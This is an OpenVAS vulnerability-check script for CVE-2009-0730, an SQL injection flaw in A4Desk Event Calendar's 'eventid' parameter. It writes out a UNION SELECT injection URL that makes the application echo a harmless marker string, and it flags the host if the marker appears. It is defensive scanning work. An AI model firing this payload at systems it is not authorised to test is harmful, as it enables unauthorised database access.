###############################################################################
# OpenVAS Vulnerability Test
# $Id: A4Desk_event_calendar_sql_injection.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# A4Desk Event Calendar 'eventid' Parameter SQL Injection
# Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "A4Desk Event Calendar is prone to an SQL-injection vulnerability
  because it fails to sufficiently sanitize user-supplied data before
  using it in an SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database. 

  Seee http://www.securityfocus.com/bid/33835/ and
  http://php.a4desk.com/calendar/ for further informations.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100006");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-03-02 16:07:07 +0100 (Mon, 02 Mar 2009)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-0730");
 script_bugtraq_id(33863);

 script_name("A4Desk Event Calendar 'eventid' Parameter SQL Injection Vulnerability");

 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

if( ! can_host_php( port:port ) ) exit( 0 );

dir = make_list_unique( "/", "/calendar", cgi_dirs( port:port ) );

foreach d ( dir )
{
 url = d + "/admin/index.php?eventid=-1+union+all+select+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4,5,6--";

 if( http_vuln_check( port:port, url:url, pattern:"OpenVAS-SQL-Injection-Test" ) )
 {
   report = report_vuln_url( port:port, url:url );
   security_message( port:port, data:report );
   exit( 0 );
 }
}
exit(0);
